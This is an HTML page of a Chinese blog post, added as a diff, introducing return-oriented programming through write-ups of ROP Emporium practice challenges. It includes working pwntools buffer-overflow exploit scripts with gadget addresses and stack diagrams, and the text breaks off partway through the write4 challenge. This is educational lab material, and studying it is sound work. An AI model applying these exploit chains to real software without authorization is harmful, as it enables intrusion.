@@ -1,0 +1,887 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="gla2xy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ROPROP（Return Oriented Programming）即返回导向编程，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 gadgets 通常是以 ret 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。 返回导向编程这一名称的由来是因为其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP入门">
+<meta property="og:url" content="http://example.com/2024/06/16/PWN/ROP%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="gla2xy&#39;s blog">
+<meta property="og:description" content="ROPROP（Return Oriented Programming）即返回导向编程，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 gadgets 通常是以 ret 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。 返回导向编程这一名称的由来是因为其">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406131507017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406131513101.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132227520.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132233296.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132241606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141116715.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141117878.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141041208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141041303.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141156944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141510092.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141622067.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141639886.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151101833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151147975.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151434337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151225830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151615318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151727464.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152257370.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152300254.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152350307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152223470.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161505358.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161611459.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161611115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161158023.png">
+<meta property="article:published_time" content="2024-06-16T08:32:55.000Z">
+<meta property="article:modified_time" content="2024-06-16T08:35:24.868Z">
+<meta property="article:author" content="gla2xy">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406131507017.png">
+  
+  
+  
+  <title>ROP入门 - gla2xy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>gal2xy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ROP入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-16 16:32" pubdate>
+          2024年6月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          154 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ROP入门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP（Return Oriented Programming）即<strong>返回导向编程</strong>，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p>
+<p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p>
+<p>使用 ROP 攻击一般得满足如下条件：</p>
+<ul>
+<li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+<p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p>
+<p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p>
+<h1 id="ROP-Emporium"><a href="#ROP-Emporium" class="headerlink" title="ROP Emporium"></a>ROP Emporium</h1><p>以下题解都是x86_64架构的题目题解。在x86_64架构中，我们需要注意它的传参规则：<strong>参数优先通过rdi、rsi、rdx、rcx、r8、r9寄存器传递，如有还有剩余参数则通过栈传递</strong>。同时还需要注意，x86_64架构中有很多高级指令要求<strong>栈对齐（16bytes对齐）</strong>。</p>
+<h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>以x86_64架构的题目为例进行分析。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406131507017.png" srcset="/img/loading.gif" lazyload></p>
+<p>很明显<code>read</code>这里存在缓冲区溢出，通过构造特定的输入可以使返回地址指向<code>ret2win</code>函数，该函数如下：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406131513101.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样一来就可以得到flag。</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2win&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2win&#x27;</span>)<br>ret2win_func_addr = elf.symbols[<span class="hljs-string">&quot;ret2win&quot;</span>]<br>ret_addr = <span class="hljs-number">0x400755</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(ret_addr) + p64(ret2win_func_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p>由于x86_64架构需要栈对齐（16bytes对齐），所以需要在<code>p64(ret2win_func_addr)</code>前加retn指令的地址填充，这样就会在调用<code>system()</code>函数时，栈是对齐的。</p>
+<blockquote>
+<p>这个是否对齐可以进行gdb动调，如果执行movaps指令时rsp不是16字节对齐，那么就需要添加ret指令来对齐</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132227520.png" srcset="/img/loading.gif" lazyload></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132233296.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>差不多的<code>pwnme</code>函数，这里就不放图了。显然这个函数也是存在缓冲区溢出漏洞。查找字符串，发现<code>/bin/cat flag.txt</code>字符串（没有被引用），而且恰好又存在<code>system</code>函数，这不就可以构造一个ROP链了！（<code>usefulFunction</code>函数没用，因为它内部调用<code>system</code>函数时的参数并不能帮助我们获得flag，所以需要我们手动构造参数传递并调用<code>system</code>函数）</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406132241606.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据<strong>x86_64的传参规则：参数优先通过rdi、rsi、rdx、rcx、r8、r9寄存器传递，如有还有剩余参数则通过栈传递</strong>。</p>
+<p>因此我们需要找到<code>pop rdi;ret;</code>指令（称之为<code>gadget</code>），这样我们可以通过<code>pop rdi</code>传递<code>/bin/cat flag.txt</code>字符串，再通过<code>ret</code>将<code>rip</code>指向<code>system</code>函数首地址（或<code>call system</code>指令的首地址）。</p>
+<p>我是用的是<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>工具帮我找这样的<code>gadget</code>：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141116715.png" srcset="/img/loading.gif" lazyload></p>
+<p>地址对应代码如下（<code>pop rdi</code>的硬编码为<code>5f</code>）：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141117878.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到这样的<code>gadget</code>之后，初步构造的ROP链应该如下（还未添加ret指令进行栈对齐）：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">低地址<br><span class="hljs-code">+----------------+</span> &lt;- rsp<br><span class="hljs-section">|   填充字符      | &lt;- 局部变量s(32bytes)</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-section">|   填充字符      | &lt;- 原调用者的rbp (8bytes)</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-section">|pop rdi;ret;地址| &lt;- 调用该函数的返回地址</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-section">|usefulString addr|</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-section">|  system addr   |</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-section">|     ......     | </span><br><span class="hljs-section">+----------------+</span><br>高地址<br></code></pre></td></tr></table></figure>
+
+<p>然后对应的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(pop_ret_addr) + p64(usefulString_addr) + p64(system_addr)<br></code></pre></td></tr></table></figure>
+
+<p>gdb跟随调试，自然是出现了栈未对齐的错误：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141041208.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141041303.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上面两幅图可以看出，真正要求栈对齐的是<code>movaps</code>指令，并不是说我们在调用<code>system</code>等函数时必须栈对齐！！！（之前一直理解错了，以为是函数调用时栈必须对齐，我说怎么这么奇怪呢）</p>
+<p>为了修正栈未对齐的问题，我们需要在payload中添加一个ret指令，可行的方法有如下两种：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">低地址<br>+<span class="hljs-params">----------------</span>+ &lt;- rsp                                    +<span class="hljs-params">----------------</span>+ &lt;- rsp<br>|   填充字符      | &lt;- 局部变量s<span class="hljs-params">(32bytes)</span>                       |   填充字符      | &lt;- 局部变量s<span class="hljs-params">(32bytes)</span><br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|   填充字符      | &lt;- 原调用者的rbp <span class="hljs-params">(8bytes)</span>                   |   填充字符      | &lt;- 原调用者的rbp <span class="hljs-params">(8bytes)</span><br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|pop rdi;ret;地址| &lt;- 调用该函数的返回地址                       |     ret地址     | &lt;- 调用该函数的返回地址<br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|usefulString地址|                                            |pop rdi;ret;地址|<br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|     ret地址     |                                           |usefulString地址| <br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|     system地址  |                                           |  system地址    |<br>+<span class="hljs-params">----------------</span>+                                           +<span class="hljs-params">----------------</span>+<br>|     <span class="hljs-string">......</span>     |                                           |     <span class="hljs-string">......</span>     |<br>高地址                                                        <br></code></pre></td></tr></table></figure>
+
+<p>不可在<code>pop rdi;ret</code>与<code>usefulString</code>之间添加<code>ret</code>，这样会打破ROP链原本功能，因为我们让执行<code>pop rdi</code>就是为了弹<code>usefulString</code>的地址给<code>rdi</code>，作为<code>system()</code>的参数。</p>
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./split&quot;</span>)<br><span class="hljs-comment">#sh = gdb.debug(&quot;./split&quot;, &quot;break *0x400741&quot;)</span><br><br>system_addr = <span class="hljs-number">0x400560</span><br>pop_ret_addr = <span class="hljs-number">0x4007c3</span><br>ret_addr = <span class="hljs-number">0x400741</span><br>usefulString_addr = <span class="hljs-number">0x601060</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(ret_addr) + p64(pop_ret_addr) + p64(usefulString_addr) + p64(system_addr)<br><br>sh.sendline(payload)<br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>同样的<code>pwnme()</code>函数同样的漏洞，额外存在三个外部导入函数：<code>callme_one</code>、<code>callme_two</code>、<code>callme_three</code>，它们都来自<code>libcallme.so</code>动态库。</p>
+<p><code>callme_one</code>函数要求传入的三个参数等于特定值，功能为读取<code>encrypted_flag.dat</code>中的数据。</p>
+<p><code>callme_two</code>函数也要求传入的三个参数等于特定值，功能为读取<code>key1.dat</code>的数据，用于 <code>encrypted_flag.dat</code>中的数据解密。</p>
+<p><code>callme_three</code>函数也要求传入的三个参数等于特定值，功能为读取<code>key2.dat</code>的数据，用于 <code>encrypted_flag.dat</code>中的数据解密，然后输出解密结果。</p>
+<p>思路肯定是通过栈溢出使得能够调用以上三个函数。为此我们需要寻找<code>pop rdi;pop rsi;pop rdx;ret</code>这样的<code>gadget</code>，或者<code>pop rdi;ret;</code>、<code>pop rsi;ret;</code>、<code>pop rdx;ret;</code>这样的<code>gadget</code>。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141156944.png" srcset="/img/loading.gif" lazyload></p>
+<p>初步ROP链构造如下所示：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs coq">低地址<br>+--------------------+ &lt;- rsp                               <br>|       <span class="hljs-type">填充字符       | &lt;- 局部变量s</span>(<span class="hljs-number">32</span>bytes)                      <br>+--------------------+                                          <br>|       <span class="hljs-type">填充字符       | &lt;- 原调用者的rbp</span> (<span class="hljs-number">8</span>bytes)               <br>+--------------------+  &lt;------------①-----------  如果栈未对齐，可选一处位置添加ret指令                              <br>| <span class="hljs-type">pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">ret</span>地址 | <span class="hljs-type">&lt;- 调用该函数的返回地址                  |  </span><br><span class="hljs-type">+--------------------+                                       |</span><br><span class="hljs-type">|         a1</span>         |                                       <span class="hljs-type">|  </span><br><span class="hljs-type">+--------------------+                                       ②   </span><br><span class="hljs-type">|         a2</span>         |                                       <span class="hljs-type">|  </span><br><span class="hljs-type">+--------------------+                                       |    </span><br><span class="hljs-type">|         a3</span>         |                                       <span class="hljs-type">|</span><br><span class="hljs-type">+--------------------+  &lt;-------------------------------------                                    </span><br><span class="hljs-type">|     callme_one</span>地址  |     <br><span class="hljs-type">+--------------------+</span><br><span class="hljs-type">| pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">ret</span>地址 |                   <br><span class="hljs-type">+--------------------+                                       </span><br><span class="hljs-type">|         a1</span>         |                                        <br><span class="hljs-type">+--------------------+                                          </span><br><span class="hljs-type">|         a2</span>         |                                         <br><span class="hljs-type">+--------------------+                                           </span><br><span class="hljs-type">|         a3</span>         |                                       <br><span class="hljs-type">+--------------------+                                      </span><br><span class="hljs-type">|     callme_two</span>地址  |<br><span class="hljs-type">+--------------------+ </span><br><span class="hljs-type">| pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">pop</span>|<span class="hljs-type">ret</span>地址 |                   <br><span class="hljs-type">+--------------------+                                       </span><br><span class="hljs-type">|         a1</span>         |                                        <br><span class="hljs-type">+--------------------+                                          </span><br><span class="hljs-type">|         a2</span>         |                                         <br><span class="hljs-type">+--------------------+                                           </span><br><span class="hljs-type">|         a3</span>         |                                       <br><span class="hljs-type">+--------------------+                                      </span><br><span class="hljs-type">|     callme_two</span>地址  |<br><span class="hljs-type">+--------------------+ </span><br><span class="hljs-type">高地址      </span><br></code></pre></td></tr></table></figure>
+
+<p>gdb调试后发现<code>fopen</code>函数内有<code>movaps</code>指令，因此需要栈对齐。</p>
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./callme&quot;</span>)<br><br>gadget_addr = <span class="hljs-number">0x40093c</span><br>param_a1 = <span class="hljs-number">0xDEADBEEFDEADBEEF</span><br>param_a2 = <span class="hljs-number">0xCAFEBABECAFEBABE</span><br>param_a3 = <span class="hljs-number">0xD00DF00DD00DF00D</span><br>callme_one_addr = <span class="hljs-number">0x400720</span><br>callme_two_addr = <span class="hljs-number">0x400740</span><br>callme_three_addr = <span class="hljs-number">0x4006F0</span><br>ret_addr = <span class="hljs-number">0x4008f1</span><br>payload = (<span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(gadget_addr) + p64(param_a1) + p64(param_a2) + p64(param_a3)<br>           + p64(ret_addr) + p64(callme_one_addr)<br>           + p64(gadget_addr) + p64(param_a1) + p64(param_a2) + p64(param_a3) + p64(callme_two_addr)<br>           + p64(gadget_addr) + p64(param_a1) + p64(param_a2) + p64(param_a3) + p64(callme_three_addr))<br><br>sh.send(payload)<br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141510092.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>函数主要功能在<code>libwrite4.so</code>动态库中，整个思路是通过<code>pwnme</code>函数的缓冲区溢出调用<code>print_file</code>函数，读取<code>flag.txt</code>文件并输出flag。然而心心念念的<code>flag.txt</code>字符串并不存在于程序中，因此如何构造<code>gadget</code>使得我们能够在内存中写入这并读取样的字符串成为了关键。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141622067.png" srcset="/img/loading.gif" lazyload></p>
+<p>官方文档提示寻找<code>mov [reg], reg</code>这样的<code>gadget</code>可以让我们写值到内存中（比如<code>.bss</code>段和<code>.data</code>段）。也就是说，前一个<code>reg</code>的值得是<code>.bss</code>段或<code>.data</code>段的地址，后一个<code>reg</code>的值得是<code>flag.txt</code>字符串。要想实现写操作，又得需要<code>pop|pop|ret</code>这样得<code>gadget</code>，且前后两个<code>gadget</code>中的<code>reg</code>得相同。经过查找，发现只有<code>r14</code>、<code>r15</code>满足。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406141639886.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于写操作部分的ROP链，示意图如下：</p>
